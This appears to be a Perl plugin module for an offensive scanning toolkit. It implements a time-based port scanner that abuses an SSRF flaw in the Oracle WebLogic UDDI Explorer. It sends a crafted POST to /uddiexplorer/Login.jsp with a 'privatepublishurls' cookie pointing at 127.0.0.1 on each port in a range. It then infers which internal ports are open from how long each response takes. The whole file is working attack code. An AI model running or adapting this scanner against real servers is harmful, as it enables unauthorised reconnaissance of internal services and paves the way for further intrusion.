#!/usr/bin/perl
# Module T3 checker

# CONFIG
######################
my $desc ="Weblogic UDDI SSRF port scanner: Check target's open ports (timebased)\n\t Usage: black.pl .. .. -m id_module <st_port> <st_port> \n\t Port range like this: 1 1024\n"; 
our $funcName="uddi_time_port_checker_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub uddi_time_port_checker_Func()
{
	my $start, $end, @answers, $answer, $st_port, $end_port, $c_data;

	if ($ARGV[$m_arg_i+1] and $ARGV[$m_arg_i+2]){
		$st_port =$ARGV[$m_arg_i+1];
		$end_port =$ARGV[$m_arg_i+2];
		print "$st_port-$end_port - ports for scan \n\n";
	} else {
		print "Error. Please, enter a start and an end port number\n";
		exit;
	}
	
	my $data="POST /uddiexplorer/Login.jsp HTTP/1.1
User-Agent: ERPScan
Host: %HOST%
Cookie: privatepublishurls=http://127.0.0.1:%PORT%; 
Content-Length: 63
Content-Type: application/x-www-form-urlencoded

user=test&password=test&login=Login&redirect=ModifyRegistry.jsp";

	$data=~s/%HOST%/$host/s;
	
	for($c_port = $st_port; $c_port <= $end_port; $c_port++) {
		$c_data=$data;
		$c_data=~s/%PORT%/$c_port/sg;

		$start = time;
		@answers=send_bin(1,0,$c_data);
		$end   = time;
		$answer=join('', @answers);
		if (not $answer=~/200 OK/ ){print "\nSomething wrong with UDDI:\n\n"; print $answer; exit();}
		
		print "$c_port - ", ( $end - $start ) , " sec\n";
		}
	
	
	print "\n\n";
}